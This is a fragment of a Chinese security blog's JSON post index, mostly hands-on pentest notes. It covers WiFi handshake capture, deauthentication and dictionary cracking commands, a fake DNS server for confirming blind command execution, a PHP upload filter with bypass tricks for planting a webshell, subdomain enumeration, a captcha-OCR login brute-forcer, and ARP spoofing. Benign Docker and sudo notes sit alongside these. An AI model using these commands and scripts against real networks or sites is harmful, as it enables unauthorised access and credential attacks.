/etc/shadowsocks/config.json","categories":[],"tags":[]},{"title":"WIFI密码-破解命令","slug":"WIFI密码-破解命令","date":"2017-02-21T13:08:39.000Z","updated":"2017-02-21T13:13:18.041Z","comments":true,"path":"2017/02/21/WIFI密码-破解命令/","link":"","permalink":"http://www.evilclay.com/2017/02/21/WIFI密码-破解命令/","excerpt":"","text":"自己路由器坏了，暂时也懒得修，想起还有一块无线网卡，直接爆破WIFI得了。 使用虚拟机识别无线网卡的话注意两点： service.msc 开启 VM USB相关的服务 虚拟机设置页面USB控制器的三个选项全都点上 要不，要不插上网卡会没反应~~ 列出支持监控模式的网卡airmon-ng 启用wlan0airmon-ng start wlan0 列出所有的SSIDairodump-ng wlan0mon 抓BSSID 20:F4:1B:B3:E5:12 信道2的握手包(能看到已经连接的客户端)airodump-ng -c 2 –bssid 20:F4:1B:B3:E5:12 -w ~/ wlan0mon 强制BSSID20:F4:1B:B3:E5:12 客户端 B4:0B:44:91:74:B9 下线aireplay-ng -0 2 -a 20:F4:1B:B3:E5:12 -c B4:0B:44:91:74:B9 wlan0mon #### 使用字典破解BSSID 20:F4:1B:B3:E5:12 的WIFI密码aircrack-ng -a2 -b 20:F4:1B:B3:E5:12 -w ~/wifi-crack/pass.txt ~/wifi-crack/*.cap","categories":[],"tags":[]},{"title":"SQLALchemy问题调试的一点想法","slug":"SQLALchemy问题调试的一点想法","date":"2017-02-18T15:02:29.000Z","updated":"2017-02-18T15:04:12.362Z","comments":true,"path":"2017/02/18/SQLALchemy问题调试的一点想法/","link":"","permalink":"http://www.evilclay.com/2017/02/18/SQLALchemy问题调试的一点想法/","excerpt":"","text":"这周在处理工作的时候遇到了一个比较棘手的问题，加上前段时间看到的一个面试题“当你遇到的问题在google上搜不到时你会如何去做”，针对这个问题处理的时间比较长，中间也花了一些时间纠结该如何去做，想把这次处理问题的方法记录下来，提醒自己以后尽可能的高效处理遇到的BUG。 不提及具体的问题，这里简单说快速处理问题的几点想法： 1、 逐步定位问题可能的原因，一个个排除问题可能出现的组件。 2、 单独的小程序去复现BUG测试方法，而不是在原有大体量的程序下。 3、 最重要的资料都会在官网找得到来源，虽然不一定能获得解决问题的方法，说不定会找到问题的原因。 4、 解决问题的过程中难免会接触新的知识，保持好奇心去弄明白它。 5、 当前找到的解决方案不一定是最优的，但在功能、效率上来说一定是最符合现状的，心里保留余地，后期可能会因为新的姿势使用别的解决方案。","categories":[],"tags":[{"name":"想法","slug":"想法","permalink":"http://www.evilclay.com/tags/想法/"}]},{"title":"DockerHelloWorld分享备忘录","slug":"DockerHelloWorld分享备忘录","date":"2017-01-05T02:39:19.000Z","updated":"2017-01-05T02:40:23.139Z","comments":true,"path":"2017/01/05/DockerHelloWorld分享备忘录/","link":"","permalink":"http://www.evilclay.com/2017/01/05/DockerHelloWorld分享备忘录/","excerpt":"","text":"Doceker HelloWorld一些概念Docker一种轻量型的容器解决方案，通过Docker化技术可以把应用“一次封装，到处运行”，免去了手工装各种环境的体力劳动，这种容器化技术通过镜像和容器两个主要部件实现。 镜像 和 容器镜像和容器的关系 相当于 面向对象语言的 类 与 对象。 也就是说，加载镜像生成一个容器，同是又可以把新生成的容器经过修改后重新封装成一个镜像共享给大家使用。对容器修改后需要commit生成自己的镜像，否则下次加载这个镜像时修改丢失。 Docker Client可以把与Docker Deamon进行通讯的所有接口都理解为 Docker Client,可以是命令行程序，可以是C#(支持 Windows)、Java、Go、Ruby、JavaScript提供的接口。 Docker DaemonDocker最核心的后台进程，通过API方式接收并处理客户端的请求，进行操作时 要先保证 deamon 进程已经运行，如下： 仓库集中存放镜像的场所。 最大的仓库 Docker Hub，国内的公开仓库有 中科大https://lug.ustc.edu.cn/wiki/mirrors/help/docker。 Dockerfile包含各种docker指令的一个文本文件，通过这个文件创建一个docker镜像。推荐使用这种方式分享docker镜像，可以让别人清楚的了解该镜像装了哪些环境。 Docker vs Vmware Docker 使用场景对于运维来说，可以做到应用的规模化，自动化，异构化部署。 对于开发来说，提供了一个统一的开发环境，方便团队之间协同开发。 对于我们来说，.... Docker 常用命令docker info 显示 docker 系统信息 镜像数，容器数 docker stat 显示已经运行的 docker 容器 CPU 内存 IO信息 docker version 显示 docker 版本（CS）信息 docker images 显示系统中所有镜像 docker ps 显示正在运行的镜像，包含容器ID docker search ubuntu 搜索docker仓库中 ubuntu 镜像 docker pull username/mechine 从仓库下载镜像文件 docker push hujb2000/node:v2 把镜像推到自己的仓库 docker rmi 镜像ID 删除镜像 docker build -t anka9080/tagname . 在当前目录下查找Dockerfile生成镜像 docker run -d nickistre/ubuntu-lamp 后台模式(-d)启动容器 docker run -d -p 8000:80 anka9080/vulapps:tools_xunfeng 后台开启容器并指定端口映射 docker run -it mattdm/fedora /bin/bash 进入容器的交互式shell （-t终端 -i 输出输入重定向） docker run ubuntu:15.10 /bin/echo &quot;Hello world&quot; Docker 以 ubuntu15.10 镜像创建一个新容器，然后在容器里执行 bin/echo &quot;Hello world&quot;，然后输出结果。 docker logs 2b1b7a428627/cointainer_name 对后台运行容器的输出重定向显示到当前shell docker stop 2b1b7a428627/cointainer_name 关闭容器 docker port 7a38a1ad55c6 查看指定 （ID或者名字）容器的某个确定端口映射到宿主机的端口号 docker rm determined_swanson 删除容器 docker exec -it &lt;容器ID&gt; /bin/bash 进入正在运行容器的shell docker top determined_swanson 查看容器内部的进程 docker cp foo.txt mycontainer:/foo.txt 拷贝文件到 docker 容器 docker cp mycontainer:/foo.txt foo.txt 从容器冲拷贝文件到宿主机","categories":[],"tags":[{"name":"Docker","slug":"Docker","permalink":"http://www.evilclay.com/tags/Docker/"}]},{"title":"FakeDNSServer - 轻量级DNSLog查询工具","slug":"FakeDNSServer-轻量级DNSLog查询工具","date":"2017-01-04T15:19:04.000Z","updated":"2017-01-05T05:46:16.618Z","comments":true,"path":"2017/01/04/FakeDNSServer-轻量级DNSLog查询工具/","link":"","permalink":"http://www.evilclay.com/2017/01/04/FakeDNSServer-轻量级DNSLog查询工具/","excerpt":"","text":"前言最近研究了类似盲注类命令执行没有回显的情况的处理方式，听了No老师的一些实战经验，手动搭建了DNSLog程序和一个简易的DNSServer，当做笔记记录下来啦。 若遇到命令执行没有回显的话，如何来验证命令执行是否真的成功了呢？ 大牛告诉我是有三种方式可以去验证的： 使用 ICMP 协议（Ping命令） 使用 HTTP 协议 （发送 HTTP 请求） 使用 DNS 协议 （发送DNS查询请求） 第一种方式可以验证命令能够执行，但是不能够把命令的回显带过来。 在Linux需要设置iptables才能把icmp的请求写入到日志文件里，当然直接开 tcpdump 或者 wireshark 这种抓包工具也能能看到有谁 ping 了你的主机的。 TCPDump命令： tcpdump -i eth0 icmp 若想永久保存ICMP信息，建议设置 iptables ： iptables -I INPUT -p icmp --icmp-type 8 -m state --state NEW,ESTABLISHED,RELATED -j LOG --log-level=1 --log-prefix &quot;Ping Request &quot; // 会把所有的ICMP请求写入到 iptables 的日志文件中 // Ubuntu/Debian日志位置: /var/log/kern.log // CentOS/RHEL/Fedora日志位置: /var/log/messages 这里是其他主机发起一次ping请求后 Kali（Debian）主机的/var/log/kern.log 输出： 第二种需要自己搭建一个HTTP服务器，然后去查Log就可以看到你在靶机发送的请求，一般在不能联网的内网的时候这个方法就比较尴尬了，也有可能HTTP协议被封掉。 这里使用 curl 发起一个带 命令执行的HTTP 请求记录，查看日志信息： vim /var/log/apache2/access.log 第三种需要搭建一个轻量型的DNS服务器，当然能接受到DNS请求验证命令执行就可以了，至于解不解析DNS请求看你心情了，而且DNS协议一般都不会被封，这篇文章主要记录的也是这种姿势。 下面有请神器上场 ~ BugScanTeam 开源的 DNSLog 程序，简直懒人福利有木有，README已经写得够详细了，不多说了，这是 Git 地址 https://github.com/bugscanteam/dnslog/ 在这里我就小小的提示下 需要方便的自定义DNS服务器的域名提供商请找新网（本人亲测万网，Godaddy需要认证，最后是问了Yan表哥才知道的 - -） 后面自己参照SimmpleDNSServer写了一个小的DNS服务器。 可以输出 DNS请求的来源 IP，Port 和请求的域名信息。 并不能实现真正的DNS解析！ 并不能实现真正的DNS解析！ 并不能实现真正的DNS解析！ 运行1234print \"Usage: python fake_dns_server.py\"print \"\"print \"并没有提供DNS解析功能，直接打印发起请求的IP，Port和需要解析的域名 :P\"print \"\" 在本机使用 nslookup 命令测试命令执行效果如下： 代码代码 GitHub 地址： https://github.com/Evi1CLAY/CoolPool/tree/master/Python/FakeDNSServer 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#!/usr/bin/env python# coding: utf-8# author: Anka9080# mail: funsociety.bat@gmail.com# 说明：# 没有 DNSLog 功能强大，一个轻便型 伪DNS 服务器# 可以配合 nslookup 命令 显示没有回显类漏洞的命令执行结果# 不能实现真正的DNS解析，直接打印请求的IP，Port和需要解析的域名# 说白了就是一个UDP的socket绑定在53端口循环接收DNS请求信息并格式化输出 xDimport sysimport socketimport threadclass DNSQuery(object): \"\"\" DNS请求解析类 from http://code.activestate.com/recipes/491264-mini-fake-dns-server/ \"\"\" def __init__(self, data): self.data = data self.domain = '' tipo = (ord(data[2]) &gt;&gt; 3) &amp; 15 # Opcode bits if tipo == 0: # Standard query ini = 12 lon = ord(data[ini]) while lon != 0: self.domain += data[ini+1:ini+lon+1]+'.' ini += lon+1 lon = ord(data[ini])def usage(): print \"\" print \"Usage: python fake_dns_server.py\" print \"\" print \"并没有提供DNS解析功能，直接打印发起请求的IP，Port和需要解析的域名 :P\" print \"\" sys.exit(1)def print_dns_query(data, addr): p=DNSQuery(data) ip = addr[0] port = addr[1] print 'From &#123;&#125;:&#123;&#125; DNSQuery -&gt; &#123;&#125;'.format(ip,port,p.domain)if __name__ == '__main__': try: udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # 创建一个UDP IPv4型 Socket udps.bind(('', 53)) # 绑定 53 端口 except Exception, e: print \"Failed to create socket on UDP port 53:\", e sys.exit(1) print '\\nFake DNS Server Started &gt; ... \\n' try: while 1: data, addr = udps.recvfrom(1024) thread.start_new_thread(print_dns_query, (data, addr)) except KeyboardInterrupt: print '\\n^C, Exit!' except Exception, e: print '\\nError: %s' % e finally: udps.close() 参考 https://ricterz.me/posts/%E7%AC%94%E8%AE%B0:%20Data%20Retrieval%20over%20DNS%20in%20SQL%20Injection%20Attacks http://code.activestate.com/recipes/491264-mini-fake-dns-server/ http://serverfault.com/questions/448541/how-to-know-who-ping-my-computer","categories":[],"tags":[{"name":"DNSLog","slug":"DNSLog","permalink":"http://www.evilclay.com/tags/DNSLog/"},{"name":"DNSServer","slug":"DNSServer","permalink":"http://www.evilclay.com/tags/DNSServer/"}]},{"title":"一次文件上传绕过笔记","slug":"一次文件上传绕过笔记","date":"2017-01-02T16:34:46.000Z","updated":"2017-01-04T16:47:50.529Z","comments":true,"path":"2017/01/03/一次文件上传绕过笔记/","link":"","permalink":"http://www.evilclay.com/2017/01/03/一次文件上传绕过笔记/","excerpt":"","text":"前言No老师之前给了个 PHP 上传脚本，正好趁着晚上没事做研究了一下。因为这次直接拿到了源代码，绕过的过程思路很清晰，倒是真正绕过后感觉看上去写的挺”严谨”的代码深挖下去总会有 Bug 的，除此之外，学习到一些很有用的东西，特地记录下。 上传代码先贴出上传代码： 12345678910111213141516171819202122232425262728293031323334&lt;?php$str = end(explode(\".\",$_FILES['file']['name']));if($str!=\"php\" and $str!=\"asp\" and $str!=\"jsp\" and $str!=\"aspx\") &#123; if ($_FILES[\"file\"][\"error\"] &gt; 0) &#123; echo \"Return Code: \" . $_FILES[\"file\"][\"error\"] . \"&lt;br /&gt;\"; &#125; else &#123; $str=file_get_contents($_FILES['file']['tmp_name']); $pre = \"/(\\&lt;\\? |\\?\\&gt;|\\&lt;\\%|[$]_GET|[$]_POST|[$]_COOKIE|passthru|open|[$]_FILES|system|eval|exec|assert)/i\"; if(preg_match($pre,$str)) &#123;echo 'WTF!';&#125; else &#123; if (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"])) &#123; echo $_FILES[\"file\"][\"name\"] . \" already exists. \"; &#125; else &#123; // echo $_FILES[\"file\"][\"tmp_name\"]; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\"upload/\" . $_FILES[\"file\"][\"name\"]); echo \"Stored in: \" . \"upload/\" . $_FILES[\"file\"][\"name\"]; &#125; &#125; &#125; &#125;else &#123; echo \"$str error\"; &#125;?&gt; 自己本地写了个表单，用来提交上传请求 index.html: 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;File Upload Bypass Demo&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=\"upload.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"file\" name=\"file\"&gt;&lt;/input&gt; &lt;input type=\"submit\"&gt;&lt;/input&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 分析分析 upload.php 的源码，可以看出首先会对上传文件的后缀名做黑名单过滤，然后对上传文件的内容进行过滤，所以Fuzz的时候主要是解决这两个问题。 绕过后缀名过滤这个比较简单，使用 Burp 代理请求，在后缀名后面多输入一个空格就可以。上传 fuck.php 的时候 burp 拦截，修改成如下： 修改后可以绕过 upload.php 中对后缀名的检查，同时不影响文件的生成(move_uploaded_file)。 绕过文本内容过滤首先要知道上传可以执行的一句话木马（脚本）需要的必要条件： 能被 PHP 引擎（Zend Engine）解析执行（PHP环境）。 脚本中有用户可以控制的输入点。 用户输入的数据能够被当做 PHP代码执行。 说白了，可以归纳为两点：1,用户能控制输入 2, 输入的数据能够当做代码解析。有这两点就写个 shell 就已经足够了。 之所以在这里分成3点，原因我会从源码的角度对这三点进行分析，并给出对应的绕过方案。 构造PHP环境因为正则表达式中\\&lt;\\? |\\?\\&gt;|\\&lt;\\%|这段代码的存在导致无法正常定义 PHP 脚本，所以，可以用这种方法定义：1&lt;script language=\"php\"&gt; PHP 代码 &lt;/script&gt; 插入用户可以控制的输入点因为 [$]_GET|[$]_POST|[$]_COOKIE 都已经被过滤，所以无非找找其他的输入接收关键字有没有过滤，或者换一种方式（感觉应该会有，我没想到），在这里突然想到了没有过滤 REQUEST 方法，随意直接用 REQUEST 构造 一句话就可以了。 让数据可以在服务端当做PHP代码执行因为 passthru|open|[$]_FILES|system|eval|exec|assert 这些危险函数直接被 ban 了，所以要想办法绕过， ———————– 放着，这个坑以后填上 —————————","categories":[],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"http://www.evilclay.com/tags/文件上传/"}]},{"title":"DomainSeeker 多方式收集目标子域名信息","slug":"domain-seeker二级域名收集脚本","date":"2017-01-02T06:34:07.000Z","updated":"2017-01-02T06:45:46.364Z","comments":true,"path":"2017/01/02/domain-seeker二级域名收集脚本/","link":"","permalink":"http://www.evilclay.com/2017/01/02/domain-seeker二级域名收集脚本/","excerpt":"","text":"前言参照猪猪侠的 wydomain 项目写一个简单的二级域名查找的脚本，提供三种方式来收集目标的子域名信息。 DNS枚举 搜索引擎结果 子域名查询接口 并且综合三种方式收集的子域名进行去重处理。 运行程序帮助 123456789101112usage: domain_seeker.py [-h] [-t NUM] [-d DOMAIN] [-b] [-s] [-a]Multi-method SubDomain Seekeroptional arguments: -h, --help show this help message and exit -t NUM, --thread NUM thread count -d DOMAIN, --domain DOMAIN target doamin -b, --bruteforce dns bruteforce -s, --search search engine -a, --api domain finder api 测试收集 swu.edu.cn 的所有域名，可以看到经过去重后还有282个子域名条目。 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288#!/usr/bin/env python# encoding:utf-8# author: Anka9080# email: funsociety.bat@gmail.comimport reimport sysimport Queueimport loggingimport threadingimport requestsimport argparseimport dns.resolverimport dns.rdatatypelogging.basicConfig( level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s',)logging.getLogger(\"requests\").setLevel(logging.WARN)# 域名服务器NAMESERVERS = [ '114.114.114.114', '119.29.29.29', '223.5.5.5', '8.8.8.8', '182.254.116.116', '223.6.6.6', '8.8.4.4', '180.76.76.76', '216.146.35.35', '123.125.81.6', '218.30.118.6',]class FileUtils(object): @staticmethod def getLines(filename): with open(filename) as fn: for line in fn.readlines(): yield line.strip()# 域名基类(提供解析相关的功能函数)class Domain(object): def __init__(self,nameservers=[],timeout=''): self.resolver = dns.resolver.Resolver() if nameservers: self.resolver.nameservers = nameservers if timeout: self.resolver.timeout = timeout # 获取泛解析的IP列表 def extensive(self,target): test_domains = ['Anka9080_&#123;0&#125;.&#123;1&#125;'.format(i,target) for i in range(3)] # print '-- test_domains:',test_domains e_ips = [] for domain in test_domains: record = self.query(domain,'A') if record is not None: e_ips.extend(record['A']) return e_ips # 解析域名 def query(self,target,rdtype): try: answer = self.resolver.query(target, rdtype) return self.parser(answer) except dns.resolver.NoAnswer: return None # catch the except, nothing to do except dns.resolver.NXDOMAIN: return None # catch the except, nothing to do except dns.resolver.Timeout: # timeout retry print(target, rdtype, '&lt;timeout&gt;') except Exception, e: raise e logging.info(str(e)) def parser(self, answer): \"\"\"result relationship only two format @domain domain name @address ip address \"\"\" result = &#123;&#125; for rrsets in answer.response.answer: for item in rrsets.items: rdtype = self.get_type_name(item.rdtype) if item.rdtype == self.get_type_id('A'): if result.has_key(rdtype): result[rdtype].append(item.address) else: result[rdtype] = [item.address] return result def is_domain(self, domain): domain_regex = re.compile( r'(?:[A-Z0-9_](?:[A-Z0-9-_]&#123;0,247&#125;[A-Z0-9])?\\.)+(?:[A-Z]&#123;2,6&#125;|[A-Z0-9-]&#123;2,&#125;(?&lt;!-))\\Z', re.IGNORECASE) return True if domain_regex.match(domain) else False def get_type_name(self, typeid): return dns.rdatatype.to_text(typeid) def get_type_id(self, name): return dns.rdatatype.from_text(name)# 域名枚举类(域名解析的入口)class DomainFuzzer(object): def __init__(self,target,dict_file='top200_domain.txt'): self.target = target self.dict = list(set(FileUtils.getLines(dict_file))) self.resolver = Domain(NAMESERVERS,timeout=5) # 多线程枚举 入口 def run(self,thread_cnt=16): # 所有子域名队列,check后存在的域名和IP字典 all_queue,ok_queue = Queue.Queue(),Queue.Queue() for line in self.dict: all_queue.put('.'.join([str(line),str(self.target)])) e_ips,threads = self.resolver.extensive(self.target),[] # print '-- extensive',e_ips for i in xrange(thread_cnt): threads.append(self.bruteWorker(self.resolver,all_queue,ok_queue,e_ips)) for t in threads: t.start() for t in threads: t.join() while not ok_queue.empty(): yield ok_queue.get() # 单线程枚举入口 class bruteWorker(threading.Thread): def __init__(self,resolver,all_queue,ok_queue,extensive=[]): threading.Thread.__init__(self) self.all_queue = all_queue self.resolver = resolver self.ok_queue = ok_queue self.extensive = extensive def run(self): try: while not self.all_queue.empty(): sub = self.all_queue.get_nowait() # print '-- sub: ',sub record = self.resolver.query(sub,'A') if record: ips = record['A'] for ip in ips: if ip not in self.extensive: self.ok_queue.put(sub) break return self.ok_queue except Exception,e: pass# 好搜搜索引擎接口class HaosouAPI(object): api = 'http://www.haosou.com/s?src=360sou_newhome&amp;q=site:' # 好搜搜索引擎的入口 def __init__(self,target): self.target = target self.ptn = self.get_ptn() def get_ptn(self): tmp = self.target.replace('.','\\.') return re.compile('linkinfo\\\"\\&gt;\\&lt;cite\\&gt;(.+?\\.'+tmp+')') def run(self,page_cnt=50): subs = [] for x in xrange(1,page_cnt): url = self.api+self.target+'&amp;pn='+str(x) try: rsp = requests.get(url) except Exception,e: logging.info(str(e)) continue html = rsp.text items = re.findall(self.ptn,html) for i in items: subs.append(i) return set(subs)# i.links.cn 子域名查询接口class ILinksAPI(object): api = 'http://i.links.cn/subdomain/' headers = &#123; \"Content-Type\": \"application/x-www-form-urlencoded\", \"Referer\": \"http://i.links.cn/subdomain/\", \"User-Agent\":\"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.87 Safari/537.36\" &#125; def __init__(self,target): self.target = target self.ptn = self.get_ptn() def get_ptn(self): tmp = self.target.replace('.','\\.') return re.compile('https?://([\\w\\-\\.]*?'+tmp+')') def run(self): subs = set() data = &#123; 'domain':self.target, 'b2':1, \"b3\":1, \"b4\":1 &#125; try: rsp = requests.post(self.api,headers=self.headers,data=data) except Exception,e: logging.info(str(e)) return subs html = rsp.text items = re.findall(self.ptn,html) for i in items: subs.add(i) return subs def run(args): domain = args.domain thread_cnt = int(args.thread) if not domain: print('usage: domain_seeker.py -d aliyun.com -a') sys.exit(1) res_subs = set() # 使用 API if args.api: iapi = ILinksAPI(domain) subs = iapi.run() logging.info('API Module success with '+str(len(subs))) res_subs = res_subs.union(subs) # 使用搜索引擎 if args.search: ha = HaosouAPI(domain) subs = ha.run() logging.info('Search Engine Module success with '+str(len(subs))) res_subs = res_subs.union(subs) # 使用 dns 枚举 if args.bruteforce: # logging.info(\"Fuck\") df = DomainFuzzer(domain) # 爆破得到的域名列表 subs = set() for sub in df.run(thread_cnt): subs.add(sub) logging.info('Bruteforce Module success with '+str(len(subs))) res_subs = res_subs.union(subs) logging.info('End success with '+str(len(res_subs))) for x in res_subs: print x return res_subsif __name__ == '__main__': parser = argparse.ArgumentParser(description=\"Multi-method SubDomain Seeker\") parser.add_argument(\"-t\",\"--thread\",metavar='NUM',default=100,help=\"thread count\") parser.add_argument(\"-d\",\"--domain\",metavar='DOMAIN',help=\"target doamin\") parser.add_argument(\"-b\",\"--bruteforce\",help=\"dns bruteforce\",action='store_true') parser.add_argument(\"-s\",\"--search\",help=\"search engine\",action='store_true') parser.add_argument(\"-a\",\"--api\",help=\"domain finder api\",action='store_true') args = parser.parse_args() try: run(args) except KeyboardInterrupt: logging.info(\"Ctrl C - Human Stop\") sys.exit(1) GitHub源码： https://github.com/Evi1CLAY/CoolPool 参考 https://github.com/ring04h/wydomain","categories":[],"tags":[{"name":"二级域名查找","slug":"二级域名查找","permalink":"http://www.evilclay.com/tags/二级域名查找/"},{"name":"DNS枚举","slug":"DNS枚举","permalink":"http://www.evilclay.com/tags/DNS枚举/"}]},{"title":"识别验证码账户暴力破解小记","slug":"识别验证码账户暴力破解小记","date":"2016-12-17T16:21:10.000Z","updated":"2016-12-17T16:46:58.959Z","comments":true,"path":"2016/12/18/识别验证码账户暴力破解小记/","link":"","permalink":"http://www.evilclay.com/2016/12/18/识别验证码账户暴力破解小记/","excerpt":"","text":"前言首先能使用工具重放用户的请求，然后再考虑表单暴力破解。先分析下正常登录通讯流程： 用户访问 login 页面 —-&gt; 服务器返回 响应，在头部设置 cookie 用户带着得到的 cookie 去请求验证码图片 —-&gt; 服务器返回验证码图片 用户带着cookie 去 post 登录表单 —-&gt; 服务器根据cookie选定该用户服务器端的验证码与客户端传来的作对比，成功比对其它登录信息 由于对验证码功能开发这块不了解，导致初步分析的时候重放POST请求忘记带cookie服务器一直返回内部错误，真是羞涩，好在后面一点点 fuzz 的时候把问题找出来了，所以才有了上面的3个通讯步骤。 在这个实验中，首先要把 图片验证码识别 成字符串，然后 维持cookie 请求发送 POST 包就可以了，原理很清新。所以能否成功利用很大程度取决于服务器是否使用了足够“操蛋”的验证码，所以说并不是用了验证码，就可以避免口令爆破了。 环境配置需要安装下面的第三方库 sudo apt-get install tesseract-ocr // Google的开源验证码识别程序 pip install pytesseract // tesseract-ocr 的 py 接口 pip install Image // 图片处理库 import requests // 网络请求库 在这里顺带说一句，默认可以识别英文字符，如识别中文的话需要自行搜索下载 tesseract-ocr 的中文语言包放在指定目录里。 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/usr/bin/python# coding:utf-8# Author: Anka9080import requestsimport Imageimport pytesseract# fuck captcha auto login scriptHEADERS = &#123; 'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.87 Safari/537.36', 'Referer':'http://foo.com/jeeadmin/jeecms/login.do'&#125;class FuckCaptchaLogin(object): def __init__(self): self.login_url = 'http://foo.com/jeeadmin/jeecms/login.do' self.captcha_url = 'http://foo.com/captcha.svl' self.image_name = 'captcha.jpeg' self.login() pass def download_image(self,s): r = s.get(url=self.captcha_url,headers=HEADERS) with open(self.image_name,'wb') as f: for chunk in r.iter_content(chunk_size=1024): f.write(chunk) f.flush() pass def orc_image(self): im = Image.open(self.image_name) captcha_string = pytesseract.image_to_string(im, lang='eng').strip() return captcha_string def login(self): s = requests.Session() r = s.get(url = self.login_url,headers=HEADERS) r = s.get(url=self.login_url,headers=HEADERS) print r.request.headers self.download_image(s) captcha_string = self.orc_image() post_data = &#123; 'username':'admin', 'password':'admin', 'captcha':captcha_string, 'submit.x':'20', 'submit.y':'20', &#125; r = s.post(url='http://foo.com/jeeadmin/jeecms/login.do',headers=HEADERS,data=post_data) print r.textif __name__ == '__main__': FuckCaptchaLogin()","categories":[],"tags":[{"name":"验证码识别","slug":"验证码识别","permalink":"http://www.evilclay.com/tags/验证码识别/"},{"name":"暴力破解","slug":"暴力破解","permalink":"http://www.evilclay.com/tags/暴力破解/"}]},{"title":"Linux的sudo权限分析小记","slug":"Linux的sudo权限分析小记","date":"2016-11-06T04:07:05.000Z","updated":"2016-11-06T04:07:51.574Z","comments":true,"path":"2016/11/06/Linux的sudo权限分析小记/","link":"","permalink":"http://www.evilclay.com/2016/11/06/Linux的sudo权限分析小记/","excerpt":"","text":"概述所谓 sudo ，就是 &quot;superuser do&quot;,即让普通用户以 root 权限执行命令。 添加 sudo 权限给已经存在的用户添加 sudo 权限一般有两种方式： 1. 直接修改 /etc/sudoer 文件 2. 使用命令把用户添加到sudo组 不管是方式1 还是 方式2 最终都可以在 sudo 的配置文件 /etc/sudoer 中看出原因，正所谓”一切皆文件”。 直接修改 /etc/sudoer 文件 sudo vi /etc/sudoers // 追加如下格式字符串 username ALL=(ALL:ALL) ALL // 这是把某一用户赋予 sudo 权限，若需要对整个用户组赋予 sudo 权限需要用关键字 %作为标志 %groupname ALL=(ALL:ALL) ALL 使用命令把用户添加到sudo组 sudo adduser anka1 sudo // 或者 sudo usermod -a -G sudo anka1 这种方式虽然没有直接修改 /etc/sudoers 文件，却把 username 用户追加到sudo组中，在sudo组中的用户本身就有 sudo 权限，可以从配置文件中看出 sudo vi /etc/sudoers // 默认有如下一行 %sudo ALL=(ALL:ALL) ALL 使用命令查看 sudo 组中的成员有哪些： anka9080@evilclay:/home$ getent group sudo sudo:x:27:anka9080,anka1 // 除了默认的用户 anka9080 ， anka1 也已经被添加到 sudo 组中了。 总结所以新建一个sudo权限的用户的脚本如下： sudo useradd ankauser sudo echo &quot;ankauser:ankapass&quot; | sudo chpasswd sudo adduser ankauser sudo","categories":[],"tags":[{"name":"sudo","slug":"sudo","permalink":"http://www.evilclay.com/tags/sudo/"}]},{"title":"ARP协议分析与漏洞利用","slug":"ARP协议分析与漏洞利用","date":"2016-10-27T16:28:12.000Z","updated":"2016-10-27T16:58:01.850Z","comments":true,"path":"2016/10/28/ARP协议分析与漏洞利用/","link":"","permalink":"http://www.evilclay.com/2016/10/28/ARP协议分析与漏洞利用/","excerpt":"","text":"好早前写的一篇文章了，突然翻到，看到C语言写的代码我羞涩了 xD ARP 协议是什么局域网通信中需要知道目标主机的MAC地址才能与其建立连接。 ARP是地址解析协议，根据目标主机的IP地址获取其MAC地址。 ARP 工作流程 ARP工作流程 如图所示局域网双方通信时： 首先检测ARP缓存表，缓存表没有目标IP-MAC映射时需要先向全网发送目的IP为192.168.1.xxx 目的MAC为FF-FF-FF-FF-FF-FF的全网广播，当局域网中IP为192.168.1.xxx的主机收到请求时， 发送一个包含自己IP-MAC的响应包给请求主机，请求主机收到响应包，解析出IP对应的MAC，写入自己的ARP缓存表。 继而，双方可以建立正常的通信。 以上是建立的是动态ARP映射条目，每项条目有预定的生存时间。 Windows系统ARP表项生存时间2min。Linux系统ARP表项生存时间30s。 可以看出ARP缓存表是双方通信的基础，这个ARP缓存表是否是可以“手动”修改的？ 当然可以。 在系统CMD下，有ARP配置命令： ARP命令 可以直接管理的当前系统的ARP缓存表。 ARP协议的漏洞主机在更新ARP缓存表时并不检测收到的ARP响应包的正确性，直接根据响应包的信息对缓存表进行更新。 无论之前是否发过ARP请求，再收到ARP响应包后都会对ARP缓存表进行更新。 漏洞利用思路I． 攻击机构造虚假ARP响应包 发送给 目标主机。 II．目标主机更新本地ARP缓存表 III．目标主机的通信收到影响（断网，MIT攻击）。 攻击Demo1、 攻击前目标主机能够正常上网 2、 运行攻击程序 对 目标主机进行ARP 欺骗攻击主要是构造四个参数：源IP，MAC，目标IP，MAC run_arp_attack Wireshark 抓数据包 wire 数据包的详细内容 packet 攻击效果 attack_res 请求网关测试 req_gateway 请求百度网站测试 req_baidu 防护措施静态添加ARP缓存表条目，避免ARP条目的恶意被动更新。 CMD下：arp -s 目标IP 目标MAC Win8/10下，该命令权限不够，用之下方法绑定 netsh i i show in netsh -c i i add neighbors 4 192.168.1.1 0c-72-2c-25-ca-66 // 4为 第一条命令回显的本地连接网卡Idx号 结果如图： def_res 攻击程序代码(C语言)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171// ARP攻击程序源代码#include 